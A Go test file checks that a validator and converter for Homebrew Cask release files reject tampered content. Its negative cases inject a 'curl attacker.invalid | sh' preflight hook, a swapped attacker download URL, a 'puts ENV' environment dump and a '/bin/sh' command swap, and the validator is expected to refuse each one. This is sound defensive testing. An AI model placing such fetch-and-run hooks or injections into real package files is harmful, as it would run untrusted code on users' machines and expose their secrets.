package releaseartifact

import (
	"os"
	"strings"
	"testing"
)

func TestValidateCaskAcceptsGeneratedShape(t *testing.T) {
	expected := CaskExpectation{Version: "1.2.3", IntelSHA256: strings.Repeat("a", 64), ArmSHA256: strings.Repeat("b", 64)}
	raw, err := os.ReadFile("testdata/cask_v1.rb")
	if err != nil {
		t.Fatal(err)
	}
	if err := ValidateCask(raw, expected); err != nil {
		t.Fatal(err)
	}
}

func TestValidateCaskRejectsExecutableOrMismatchedContent(t *testing.T) {
	expected := CaskExpectation{Version: "1.2.3", IntelSHA256: strings.Repeat("a", 64), ArmSHA256: strings.Repeat("b", 64)}
	base := strings.Join(expectedCaskLines(expected), "\n") + "\n"
	tests := map[string]string{
		"extra hook":     strings.Replace(base, `binary "ecctl"`, "preflight do\n    system \"curl attacker.invalid | sh\"\n  end\n  binary \"ecctl\"", 1),
		"wrong URL":      strings.Replace(base, OSSBaseURL, "https://attacker.invalid", 1),
		"wrong checksum": strings.Replace(base, strings.Repeat("a", 64), strings.Repeat("c", 64), 1),
		"wrong version":  strings.Replace(base, `version "1.2.3"`, `version "1.2.4"`, 1),
		"extra Ruby":     strings.Replace(base, `cask "ecctl" do`, "puts ENV\ncask \"ecctl\" do", 1),
	}
	for name, raw := range tests {
		t.Run(name, func(t *testing.T) {
			if err := ValidateCask([]byte(raw), expected); err == nil {
				t.Fatal("ValidateCask succeeded")
			}
		})
	}
}

func TestCaskFormatsPreserveUpdaterCompatibility(t *testing.T) {
	expected := CaskExpectation{Version: "1.2.3", IntelSHA256: strings.Repeat("a", 64), ArmSHA256: strings.Repeat("b", 64)}
	for _, source := range []string{CaskFormatV1, CaskFormatV2} {
		raw, err := os.ReadFile("testdata/cask_" + source + ".rb")
		if err != nil {
			t.Fatal(err)
		}
		for _, target := range []string{CaskFormatV1, CaskFormatV2} {
			t.Run(source+" to "+target, func(t *testing.T) {
				err := ValidateCaskFormat(raw, expected, target)
				if (err == nil) != (source == target) {
					t.Fatalf("validation of %s as %s: %v", source, target, err)
				}
				converted, err := ConvertCask(raw, expected, target)
				if err != nil {
					t.Fatal(err)
				}
				fixture, err := os.ReadFile("testdata/cask_" + target + ".rb")
				if err != nil {
					t.Fatal(err)
				}
				if strings.Join(significantCaskLines(string(converted)), "\n") != strings.Join(significantCaskLines(string(fixture)), "\n") {
					t.Fatalf("conversion does not match the independent %s fixture", target)
				}
				if target == CaskFormatV1 {
					if err := ValidateCask(converted, expected); err != nil {
						t.Fatalf("old updater rejects compatibility asset: %v", err)
					}
				}
			})
		}
	}
}

func TestCaskV2RejectsUnsafeContentAndConversion(t *testing.T) {
	expected := CaskExpectation{Version: "1.2.3", IntelSHA256: strings.Repeat("a", 64), ArmSHA256: strings.Repeat("b", 64)}
	raw, err := os.ReadFile("testdata/cask_v2.rb")
	if err != nil {
		t.Fatal(err)
	}
	base := string(raw)
	for name, candidate := range map[string]string{
		"extra Ruby":      strings.Replace(base, `binary "ecctl"`, "puts ENV\nbinary \"ecctl\"", 1),
		"wrong URL":       strings.Replace(base, OSSBaseURL, "https://attacker.invalid", 1),
		"wrong checksum":  strings.Replace(base, expected.IntelSHA256, strings.Repeat("c", 64), 1),
		"wrong version":   strings.Replace(base, `version "1.2.3"`, `version "1.2.4"`, 1),
		"wrong command":   strings.Replace(base, "/usr/bin/xattr", "/bin/sh", 1),
		"Ruby path":       strings.Replace(base, "{{staged_path}}", "#{staged_path}", 1),
		"network access":  strings.Replace(base, `"{{staged_path}}/ecctl"]`, `"{{staged_path}}/ecctl"], network_access: true`, 1),
		"missing install": strings.Replace(base, `run "/usr/bin/xattr"`, `# run "/usr/bin/xattr"`, 1),
		"missing OS":      strings.Replace(base, "  depends_on :macos\n", "", 1),
		"wrong OS":        strings.Replace(base, "depends_on :macos", "depends_on :linux", 1),
	} {
		t.Run(name, func(t *testing.T) {
			if err := ValidateCaskFormat([]byte(candidate), expected, CaskFormatV2); err == nil {
				t.Fatal("unsafe v2 Cask was accepted")
			}
			for _, target := range []string{CaskFormatV1, CaskFormatV2} {
				if _, err := ConvertCask([]byte(candidate), expected, target); err == nil {
					t.Fatal("unsafe Cask was converted")
				}
			}
		})
	}
	if err := ValidateCaskFormat(raw, expected, "v3"); err == nil {
		t.Fatal("unsupported Cask format was accepted")
	}
	if _, err := ConvertCask(raw, expected, "v3"); err == nil {
		t.Fatal("unsupported Cask format was produced")
	}
}
